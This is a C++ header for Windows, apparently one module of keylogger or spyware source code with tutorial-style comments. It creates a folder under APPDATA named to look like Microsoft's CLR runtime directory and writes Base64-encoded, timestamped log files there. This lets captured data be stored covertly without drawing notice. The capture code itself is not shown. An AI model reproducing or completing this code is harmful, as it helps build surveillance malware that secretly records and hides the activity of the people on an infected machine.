#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "Helper.h"
#include "Base64.h"

//creating namespace of Input/Output to handle log files
namespace IO
{//GetOurPath basically check our path and append_seperator checks backslash(/) is needed to be added at last
    std::string GetOurPath(const bool append_seperator = false)
    {//getenv is getting environment or checking environment for current string APPDATA
        std::string appdata_dir(getenv("APPDATA"));
        std::string full = appdata_dir + "\\Microsoft\\CLR";
        return full + (append_seperator ? "\\" : "");
    }

    //This function will either create a path or show that it already exists
    bool MkOneDr(std::string path)
    {
        return(bool)CreateDirectory(path.c_str(), NULL) ||
        GetLastError() == ERROR_ALREADY_EXISTS;
    }

    //backup function for MkOneDr
    bool MKDir(std::string path)
    {
        //this for-loop is using a char pointer to go through the string
        for(char &c : path)
        {
            if(c == '\\')
            {
                c = '\0';
                if(!MkOneDr(path))
                {
                    return false;
                }
                c='\\';
            }
        }
        return true;
    }

    //This is the actual log creating program
    template <class T>
    std::string WriteLog(const T &t)
    {
        std::string path = GetOurPath(true);
        Helper::DateTime dt;
        std::string name = dt.GetDateTimeString("_") + ".log";
        try
        {
            std::ofstream file(path + name);
            if(!file) return "";
            std::ostringstream s;
            s << "[" << dt.GetDateTimeString() << "]" <<
            std::endl << t <<std::endl;
            std::string data = Base64::EncryptB64(s.str());
            file<<data;
            if(!file)
            {
                return "";
            }
            file.close();
            return name;
        }
        catch(...)
        {
            return "";
        }
    }
}
#endif // IO_H
